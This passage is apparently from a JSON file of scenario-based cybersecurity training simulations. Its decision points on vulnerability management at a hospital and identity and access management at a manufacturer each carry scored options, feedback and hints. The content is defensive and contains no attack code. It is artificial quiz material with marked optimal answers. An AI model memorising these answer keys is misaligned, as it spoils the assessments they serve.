          },
          {
            "id": "C",
            "text": "Take the system offline until vendor provides patch",
            "feedback": "{'short': 'Impacts patient care - not a viable option', 'detailed': 'Taking essential clinical equipment offline impacts patient care, which is unacceptable. Security exists to enable safe operations, not to shut down healthcare. Compensating controls allow continued operation with reduced risk.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Switch to a different vendor's system immediately",
            "feedback": "{'short': 'Not practical for complex medical systems', 'detailed': 'Medical device changes are complex: procurement, implementation, training, workflow changes, and FDA considerations. This is a long-term strategic decision, not an immediate response. Implement compensating controls now, consider vendor changes in procurement cycle.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "When you can't patch, what reduces the exploitability and impact of a vulnerability?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Compensating controls: network segmentation (isolate the device), access control (limit who can reach it), monitoring (detect attacks), vendor pressure (document and escalate)."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Vulnerability on PHI System",
        "situation": "A high-severity vulnerability is discovered on a system that stores PHI. The system is internal-only (not internet-facing) and has network segmentation. IT wants to wait for the next maintenance window (3 weeks away).\n\n**Question:** How should this vulnerability be handled?",
        "options": [
          {
            "id": "A",
            "text": "Follow standard high-severity SLA (30 days) - it's internal only",
            "feedback": "{'short': 'PHI data sensitivity elevates priority', 'detailed': \"Standard SLA doesn't account for data sensitivity. PHI breach has significant regulatory (HIPAA), legal, and reputational consequences. PHI systems warrant elevated priority regardless of network location. Apply the PHI overlay to asset criticality.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Elevate priority due to PHI - remediate within 7-14 days with interim controls",
            "feedback": "{'short': 'Correct! PHI sensitivity elevates priority; interim controls provide protection', 'detailed': 'PHI data sensitivity elevates the effective criticality. The 3-week wait is too long for a PHI system with a high vulnerability. Approach: implement interim compensating controls now (enhanced monitoring, access review), escalate for earlier maintenance window, remediate within 7-14 days. Document the elevated handling for compliance.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Emergency patch tonight - PHI risk is unacceptable",
            "feedback": "{'short': 'May be overkill given network segmentation and internal-only status', 'detailed': 'Emergency patching for an internal, segmented system may be excessive and disruptive. The risk is elevated due to PHI, but compensating controls (segmentation, internal-only) provide some protection. Expedited remediation (7-14 days) with interim controls is appropriate; emergency action (24-72 hours) may be unnecessary.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Wait for the maintenance window - segmentation mitigates the risk",
            "feedback": "{'short': \"Segmentation helps but doesn't eliminate PHI risk\", 'detailed': \"Segmentation reduces attack surface but doesn't eliminate the vulnerability. An attacker who gains internal access (phishing, compromised endpoint) can still exploit it. 3 weeks is too long for a high vulnerability on a PHI system. Escalate for earlier remediation.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How does data sensitivity (PHI) affect vulnerability prioritization?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "PHI systems warrant elevated priority due to HIPAA requirements and breach impact. Elevate high to near-critical priority. Use interim controls if immediate patching isn't possible."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Scanning Coverage Gap",
        "situation": "Current scanning covers about 70% of known assets, with major gaps in medical devices, cloud workloads, and remote endpoints. You need to improve coverage but face constraints: medical devices can't be aggressively scanned, and remote workers aren't always on VPN.\n\n**Question:** What approach will MOST effectively improve scanning coverage?",
        "options": [
          {
            "id": "A",
            "text": "Increase network scan frequency on known segments",
            "feedback": "{'short': \"Scans the same 70% more often - doesn't address gaps\", 'detailed': \"Scanning the same assets more frequently doesn't find new assets or reach unscanned populations. You need to expand coverage to the missing 30%+, which requires different approaches for different asset types.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Deploy agent-based scanning for endpoints and passive monitoring for medical devices",
            "feedback": "{'short': 'Correct! Different approaches for different asset types', 'detailed': \"Mixed approach for different challenges: agent-based scanning for endpoints (works regardless of location, continuous coverage, catches remote workers), passive network monitoring for medical devices (non-intrusive, doesn't disrupt device operation), and cloud-native scanning for cloud workloads. Each population requires appropriate scanning method.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Require all devices to connect to VPN for scanning",
            "feedback": "{'short': \"Impractical and doesn't solve medical device problem\", 'detailed': \"Requiring VPN for scanning means remote workers must connect specifically for scans - low compliance. Medical devices don't use VPN. Agent-based scanning doesn't require VPN and provides better coverage. The solution must match the environment reality.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus only on internet-facing systems - that's where attacks come from",
            "feedback": "{'short': 'Ignores internal and lateral movement risks', 'detailed': 'Internal systems are attacked via phishing, compromised endpoints, and lateral movement. Ignoring internal vulnerabilities leaves major risk. Coverage should be comprehensive across all asset types, not just perimeter.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Different asset types have different scanning constraints. What approach addresses multiple challenges?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Agent-based: endpoints (continuous, location-independent). Passive monitoring: medical devices (non-disruptive). Cloud-native: cloud workloads (API-based, integrated)."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Actively Exploited Vulnerability",
        "situation": "H-ISAC issues an urgent alert: a vulnerability present in your environment is being actively exploited in ransomware attacks against healthcare organizations. You have 89 affected systems. Normal SLA would be 30 days.\n\n**Question:** How should actively exploited vulnerabilities be handled?",
        "options": [
          {
            "id": "A",
            "text": "Follow normal SLA - our process exists for a reason",
            "feedback": "{'short': \"Normal SLA doesn't account for active exploitation\", 'detailed': 'Active exploitation changes the risk calculus entirely. Attackers are successfully using this vulnerability against your sector right now. Normal SLAs assume typical risk; active exploitation is not typical. Accelerate response.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Immediate emergency patching - override normal change process",
            "feedback": "{'short': 'Correct! Active exploitation requires emergency response', 'detailed': 'Actively exploited vulnerabilities in your sector require emergency response. The change process should have an emergency path for exactly these situations. Actions: immediate patching for internet-facing systems, expedited patching for internal, emergency change approval. The risk of exploitation exceeds the risk of expedited changes.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Add to next maintenance window with high priority",
            "feedback": "{'short': 'Too slow for active exploitation', 'detailed': 'Waiting for maintenance windows while your sector is actively being attacked is unacceptable risk. Ransomware can deploy in minutes once attackers have access. Emergency response is appropriate for actively exploited vulnerabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Implement compensating controls only - patching is too risky",
            "feedback": "{'short': 'Compensating controls alone are insufficient for active exploitation', 'detailed': \"Compensating controls reduce risk but patching eliminates it. For actively exploited vulnerabilities, patching should be the primary action with compensating controls as interim protection during rollout. Don't rely solely on controls for known, exploited vulnerabilities.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How does active exploitation change the risk and appropriate response time?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "CISA KEV catalog requires rapid remediation for actively exploited vulnerabilities. Active exploitation in your sector = emergency response. Speed of patching exceeds risk of change."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Remediation Verification",
        "situation": "IT reports that 45 critical vulnerabilities have been remediated. You need to verify before closing them. Past experience shows that 15% of 'fixed' vulnerabilities are still present on rescan.\n\n**Question:** What is the BEST approach to verify remediation?",
        "options": [
          {
            "id": "A",
            "text": "Trust IT's report and close the vulnerabilities",
            "feedback": "{'short': 'No verification = false sense of security', 'detailed': \"With a 15% historical failure rate, trusting without verification means ~7 critical vulnerabilities remain open while reported closed. Always verify remediation - security can't rely on assertion alone.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Rescan all 45 systems and verify vulnerability is resolved",
            "feedback": "{'short': 'Correct! Always verify remediation with independent scan', 'detailed': 'Verification through independent rescanning is essential. This confirms: patch actually applied, configuration actually changed, and vulnerability actually resolved. Automate verification scanning when possible. For critical vulnerabilities, consider manual verification of sample systems in addition to automated scanning.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Spot-check a sample of 10 systems",
            "feedback": "{'short': 'Sampling may miss failures for critical vulnerabilities', 'detailed': 'Sampling is reasonable for large-scale medium/low vulnerability verification, but critical vulnerabilities warrant 100% verification. The stakes are too high to miss even one failed remediation on a critical issue. Verify all critical, sample for lower severities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ask IT for screenshots of patch installation",
            "feedback": "{'short': \"Screenshots don't prove vulnerability resolution\", 'detailed': \"A screenshot shows intent to patch but doesn't prove the vulnerability is resolved. Patches can fail to install, install incorrectly, or be rolled back. Only a scan or manual verification confirms actual resolution. Independent verification is required.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What independently confirms that a vulnerability is actually fixed?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Rescan after remediation window. Independent verification - scanner confirms vulnerability no longer present. Trust but verify. Automate verification scanning."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Executive Metrics",
        "situation": "Sarah Mitchell needs to present vulnerability management program effectiveness to the board. The board isn't technical but needs to understand security posture and improvement.\n\n**Question:** What metrics BEST communicate vulnerability management effectiveness to executives?",
        "options": [
          {
            "id": "A",
            "text": "Total number of vulnerabilities found and fixed",
            "feedback": "{'short': \"Raw numbers don't indicate risk reduction\", 'detailed': \"Finding more vulnerabilities might mean better scanning or worse security. Fixing 10,000 low vulnerabilities has less impact than fixing 10 critical. Raw counts don't communicate risk or effectiveness. Use risk-based metrics.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk score trend, SLA compliance, and critical vulnerability exposure time",
            "feedback": "{'short': 'Correct! Risk-based metrics show actual security improvement', 'detailed': 'Executive metrics should show: risk score trending down (are we reducing overall risk?), SLA compliance (are we fixing in time?), and critical exposure time (how long are we vulnerable to the worst issues?). These communicate effectiveness in terms executives understand - risk reduction, process compliance, and exposure. Trend over time shows improvement.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "CVSS score distribution",
            "feedback": "{'short': 'Too technical for board consumption', 'detailed': 'CVSS scores are meaningful to security professionals but not to board members. Translate technical metrics into business impact and risk terms. Executives care about risk to the organization, not vulnerability scoring methodology.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Number of scans performed",
            "feedback": "{'short': 'Activity metric, not effectiveness metric', 'detailed': \"Scan counts measure activity, not outcomes. The board wants to know if we're more secure, not how many scans we ran. Focus on results (risk reduction) not activity (scan counts).\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Executives want to know: is risk going down, are we meeting our commitments, how exposed are we?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk-based metrics for executives: overall risk score trend, SLA compliance rate, mean time to remediate by severity, critical/exploited vulnerability count and exposure time."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "End-of-Life Systems",
        "situation": "The vulnerability scan identifies 23 systems running Windows Server 2012 R2, which is end-of-life and no longer receiving security updates. These systems support various departmental applications. Replacing them requires application migration.\n\n**Question:** What is the appropriate strategy for end-of-life systems?",
        "options": [
          {
            "id": "A",
            "text": "Continue normal operations - they've been running fine",
            "feedback": "{'short': 'EOL systems accumulate unpatched vulnerabilities', 'detailed': \"End-of-life systems no longer receive security patches. Every new vulnerability discovered remains permanently unpatched. Risk accumulates over time. 'Running fine' doesn't mean 'secure.' This is unsustainable and often violates compliance requirements.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement compensating controls and create funded migration plan with deadline",
            "feedback": "{'short': 'Correct! Protect now, plan for elimination', 'detailed': 'EOL strategy: immediate compensating controls (segmentation, enhanced monitoring, access restrictions), document residual risk with executive acceptance, and create funded migration plan with hard deadline. EOL systems should be actively tracked for elimination. Compensating controls are interim, not permanent - the goal is migration.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Shut down all EOL systems immediately",
            "feedback": "{'short': 'May disrupt critical business operations', 'detailed': 'Immediate shutdown impacts the business applications running on these systems. A planned migration protects operations while moving to supported platforms. Security enables business, not shuts it down arbitrarily.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Purchase extended support from Microsoft",
            "feedback": "{'short': 'Valid option but expensive and still temporary', 'detailed': \"Extended Security Updates (ESU) provide continued patches for a fee, but: it's expensive, coverage is limited to critical issues, and it's time-limited (3 years max). ESU buys time but doesn't eliminate the need for migration. Consider as part of plan, not the complete solution.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "EOL systems need both immediate protection and long-term elimination plan."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Strategy: compensating controls (segmentation, monitoring, access control), documented risk acceptance, and funded migration plan with deadline. ESU can buy time but isn't permanent."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D4-SIM-004",
    "title": "Identity and Access Management",
    "domain": 4,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Identity and Access Management Architect",
    "organization": {
      "name": "Northwind Dynamics",
      "industry": "Manufacturing"
    },
    "introduction": "Northwind Dynamics' identity management is a patchwork of manual processes, shared credentials, and good intentions. A terminated employee walking out with customer data was the wake-up call, but the shared admin credentials that enabled a ransomware attack got the board's attention. SOX auditors are citing access control deficiencies, and your largest customer is threatening to pull their contract without security improvements. Robert Walsh has brought you in to architect a modern IAM program. Where do you start?",
    "learning_objectives": [
      "Given a scenario, implement and maintain identity and access management",
      "Explain the purpose of mitigation techniques used to secure the enterprise",
      "Analyze indicators of malicious activity"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Addressing Deprovisioning Gap",
        "situation": "The terminated employee incident has everyone's attention. Currently, deprovisioning takes weeks because it's a manual email from HR to IT. There's no SLA and no tracking.\n\n**Question:** What is the MOST critical improvement to prevent terminated user access?",
        "options": [
          {
            "id": "A",
            "text": "Create a policy requiring HR to notify IT immediately upon termination",
            "feedback": "{'short': 'Policy without automation will still have gaps', 'detailed': 'Policy is necessary but insufficient. Manual notification is error-prone - HR may forget, email may be missed, IT may have backlog. The terminated employee incident happened despite having a notification process. Automation is required for reliable, immediate deprovisioning.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Automated deprovisioning triggered by HR system termination record",
            "feedback": "{'short': 'Correct! Automated deprovisioning eliminates human error', 'detailed': 'Automated deprovisioning: HR marks employee as terminated \u00e2\u2020\u2019 Identity system automatically disables accounts across all connected systems within minutes. No manual steps, no delays, no forgotten notifications. HR system becomes the authoritative source. This is the most reliable way to ensure terminated users lose access immediately.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Daily audit of terminated employees against active accounts",
            "feedback": "{'short': \"Detective control - catches gaps but doesn't prevent them\", 'detailed': \"Daily reconciliation is a good detective control to catch failures, but: it still allows up to 24 hours of access after termination, requires manual remediation, and doesn't scale well. Better as a backup to automated deprovisioning, not the primary control.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Require managers to report terminations to IT directly",
            "feedback": "{'short': 'More manual steps = more failure points', 'detailed': \"Adding manager notification creates another manual step that can fail. Managers aren't always available, may forget, or may not know all systems to report. Automation from authoritative HR system is more reliable than adding more human steps.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What approach ensures deprovisioning happens immediately without human intervention?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Automated deprovisioning: HR system (authoritative source) triggers automatic account disabling. No manual steps, no delays, immediate effect."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "MFA Deployment Priority",
        "situation": "The cyber insurance carrier requires MFA deployment. Currently only VPN has MFA (RSA tokens). You need to expand coverage but can't do everything at once. Cloud applications, email, and admin access are all unprotected.\n\n**Question:** What should be the FIRST priority for MFA expansion?",
        "options": [
          {
            "id": "A",
            "text": "All cloud applications - most exposed to internet",
            "feedback": "{'short': 'Cloud is important but privileged access is highest risk', 'detailed': \"Cloud applications face internet exposure, but compromised admin credentials caused the ransomware incident - that's the demonstrated highest risk. Admin accounts can access everything; regular user accounts have limited blast radius. Protect the keys to the kingdom first.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "All privileged and administrative access",
            "feedback": "{'short': 'Correct! Protect the accounts with greatest potential damage', 'detailed': 'Privileged access first: admin accounts can deploy ransomware, access all data, and cause catastrophic damage. The ransomware incident was enabled by compromised shared admin credentials. MFA on admin access: prevents credential stuffing/phishing from gaining admin, highest impact per account protected, and addresses the demonstrated risk.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "All employees for email access",
            "feedback": "{'short': 'Broad coverage but lower risk per account', 'detailed': 'Email MFA protects against business email compromise, which is valuable. But: every employee needs email (complex deployment), individual compromise is bad but limited impact vs. admin compromise. Deploy to admins first for highest risk reduction.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Manufacturing floor systems - core business",
            "feedback": "{'short': 'Manufacturing systems often have MFA challenges', 'detailed': 'Manufacturing floor systems may not support standard MFA, and users often work in environments where MFA is difficult (gloves, shared stations). These need different approaches. Address admin access first, then address manufacturing with appropriate controls.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which accounts caused the ransomware incident and have the greatest potential damage?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Privileged accounts: one compromised admin can deploy ransomware domain-wide. MFA on admin access provides highest risk reduction per account."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Privileged Access Model",
        "situation": "The shared admin credentials issue is critical. Currently, 15 people share 3 admin accounts, passwords are in a spreadsheet, and there's no logging of who did what. You need to implement proper privileged access management.\n\n**Question:** What is the MOST important PAM capability to implement first?",
        "options": [
          {
            "id": "A",
            "text": "Session recording for all privileged access",
            "feedback": "{'short': \"Valuable for forensics but doesn't prevent shared credentials\", 'detailed': \"Session recording provides audit trail and forensics, but: it doesn't prevent shared credentials, doesn't enable accountability (who logged in as shared admin?), and doesn't reduce standing privilege. Address credential management first.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Individual admin accounts with credential vaulting (no shared passwords)",
            "feedback": "{'short': 'Correct! Eliminate shared credentials and establish accountability', 'detailed': \"First priority: eliminate shared credentials. Each admin gets individual account, credentials stored in vault (not spreadsheet), check-out/check-in with audit trail, and automatic password rotation. This enables: accountability (who did what), incident investigation, and credential protection. You can't secure what you share.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Just-in-time privilege elevation",
            "feedback": "{'short': 'Advanced capability - build on credential management foundation', 'detailed': 'JIT access is powerful but requires foundation: first implement individual accounts and vaulting, then layer JIT on top. Implementing JIT with shared credentials still has shared credential problem. Walk before you run.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Privileged access workstations",
            "feedback": "{'short': \"Valuable but doesn't address shared credential problem\", 'detailed': \"PAWs provide secure admin environment, but: if admins still share credentials, PAWs don't solve accountability. Address credential management first, then consider PAWs for high-security environments.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What's the fundamental problem with shared admin accounts that needs to be solved?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Shared credentials = no accountability, no audit trail, credential exposure. Individual accounts + vaulting: each person has own account, passwords secured in vault, check-out creates audit trail."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Access Review Implementation",
        "situation": "SOX auditors cited lack of access reviews. Access has accumulated over years - users have permissions from three jobs ago. You need to implement access reviews but face resistance: 'We're too busy to review all this.'\n\n**Question:** How should access reviews be implemented to be both effective and manageable?",
        "options": [
          {
            "id": "A",
            "text": "Comprehensive annual review of all access for all users",
            "feedback": "{'short': 'Too much at once leads to rubber-stamping', 'detailed': 'Annual comprehensive reviews overwhelm reviewers with thousands of access decisions at once. Result: rubber-stamping (approve everything to get it done). Instead, distribute reviews throughout the year and focus on what matters most.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk-based approach: quarterly for privileged access, annually for standard, focus on changes",
            "feedback": "{'short': \"Correct! Prioritize by risk, focus on what's changed\", 'detailed': 'Risk-based review approach: privileged access reviewed quarterly (highest risk), standard access reviewed annually, and focus reviews on changes (new access, job changes) rather than re-certifying unchanged access. This is manageable (reviewers see less), effective (catches drift), and compliant (documented risk-based approach).'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Automated review that revokes access not used in 90 days",
            "feedback": "{'short': 'May revoke needed but infrequently used access', 'detailed': \"Usage-based revocation sounds good but: some access is needed infrequently (quarterly reports, annual processes), automatic revocation can disrupt business, and some sensitive access is 'just in case' (emergency procedures). Use usage data to inform reviews, not replace them.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Self-certification - users review and certify their own access",
            "feedback": "{'short': 'Users will certify everything they have', 'detailed': 'Users have incentive to keep all access - they certified their own access, which is no control at all. Reviews must be done by someone with authority and incentive to revoke (manager, application owner). Self-certification fails basic separation of duties.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you make reviews manageable while focusing on highest-risk access?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk-based frequency: privileged access quarterly, standard annually. Focus on changes and new access rather than re-certifying everything. Spread reviews throughout year."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Role-Based Access Control",
        "situation": "Access is currently granted individually - each application, each permission, each user. This creates thousands of individual permissions to manage. You want to implement role-based access control (RBAC).\n\n**Question:** What is the BEST approach to implementing RBAC?",
        "options": [
          {
            "id": "A",
            "text": "Create a role for every unique combination of access in the organization",
            "feedback": "{'short': 'Role explosion - defeats the purpose of RBAC', 'detailed': \"Creating too many roles (role explosion) eliminates the benefits of RBAC. If you have nearly as many roles as people, you're just renaming individual access. Roles should be based on job functions, not existing access patterns. Start with common roles that cover most users.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Start with common functional roles (HR, Finance, Engineering), refine over time",
            "feedback": "{'short': 'Correct! Start simple, expand based on need', 'detailed': 'RBAC implementation: start with clearly defined functional roles that cover the majority of the workforce, accept that some individual exceptions will exist initially, and refine roles based on access request patterns. Better to have 50 well-defined roles covering 80% of users than 500 roles covering 100%. The goal is simplification, not perfection.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Analyze all existing access and build roles from access patterns",
            "feedback": "{'short': 'Risk of codifying existing problems into roles', 'detailed': \"Bottom-up role mining from existing access: may codify excessive access into roles, reflects how access drifted rather than how it should be, and is complex analysis. Use job functions (top-down) as primary approach, with access analysis to validate. Don't build roles from accumulated access problems.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Require application teams to define all possible roles for their applications",
            "feedback": "{'short': \"Application-centric roles don't align to job functions\", 'detailed': \"Application-centric roles: each application has its own roles, doesn't align to organizational job functions, and user might need roles in 20 different applications. Organizational roles should map to application permissions, not the other way around. Central identity team defines organizational roles.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Should roles be based on current access patterns or job functions?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Functional roles based on job requirements (top-down) are better than roles built from existing access (bottom-up). Start with common roles covering most users."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "SSO Implementation",
        "situation": "Users have separate credentials for dozens of applications. This leads to: password fatigue, weak passwords, password reuse, and difficulty deprovisioning (must disable in each application). You want to implement SSO.\n\n**Question:** What is the KEY security benefit of SSO implementation?",
        "options": [
          {
            "id": "A",
            "text": "Users only need to remember one password",
            "feedback": "{'short': 'User convenience benefit, not the key security benefit', 'detailed': 'One password is a usability benefit, and fewer passwords to manage does improve security somewhat. But the KEY security benefit is centralized authentication control, not reduced passwords. One password could also be seen as a risk (single point of failure) without proper controls.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Centralized authentication enables consistent MFA and immediate deprovisioning",
            "feedback": "{'short': 'Correct! Centralized control is the key security benefit', 'detailed': \"SSO security benefits: MFA enforced at IdP (single point to protect all applications), immediate deprovisioning (disable IdP account = locked out of all applications), consistent authentication policies, and reduced attack surface (fewer credential stores). Centralized control enables security that isn't possible with distributed authentication.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Eliminates password-based attacks",
            "feedback": "{'short': 'SSO still uses passwords unless combined with passwordless', 'detailed': \"SSO typically still has a password at the IdP level - it just centralizes authentication. Password attacks shift to the IdP credential. SSO combined with MFA and ideally passwordless (FIDO2) provides strong protection, but SSO alone doesn't eliminate password attacks.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Reduces IT helpdesk password reset tickets",
            "feedback": "{'short': 'Operational benefit, not key security benefit', 'detailed': \"Fewer password resets is an operational benefit that reduces cost. It's not the key security benefit. Security benefits come from centralized control, not from reduced helpdesk calls.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What does centralizing authentication enable for security controls?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Centralized authentication: MFA enforced once (protects all apps), deprovisioning is immediate (disable IdP = no access anywhere), consistent policies across all applications."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Service Account Discovery",
        "situation": "The audit found approximately 800 service accounts, but nobody knows what they all do. Some have domain admin privileges 'because it was easier.' Many passwords haven't been changed in years.\n\n**Question:** What is the FIRST step in addressing the service account problem?",
        "options": [
          {
            "id": "A",
            "text": "Force password change on all service accounts immediately",
            "feedback": "{'short': 'Will cause widespread application failures', 'detailed': \"Mass password rotation without knowing what services use which accounts will break applications throughout the organization. You'll have cascading failures and emergency rollbacks. Inventory first, then planned rotation with application team coordination.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Complete inventory: document each account, owner, purpose, and permissions",
            "feedback": "{'short': \"Correct! You can't manage what you don't understand\", 'detailed': \"Service account inventory first: identify all service accounts, determine what each account does (which application/service), assign an owner (who's responsible), document current permissions, and assess if permissions are appropriate. This inventory enables: remediation planning, ownership accountability, and informed decision-making about changes.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Revoke domain admin from all service accounts",
            "feedback": "{'short': 'May break critical services without proper analysis', 'detailed': 'Revoking domain admin is the right goal but doing it blindly will break services that (incorrectly) require it. First, inventory to understand which accounts have domain admin and why, then systematically remediate with application team coordination.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
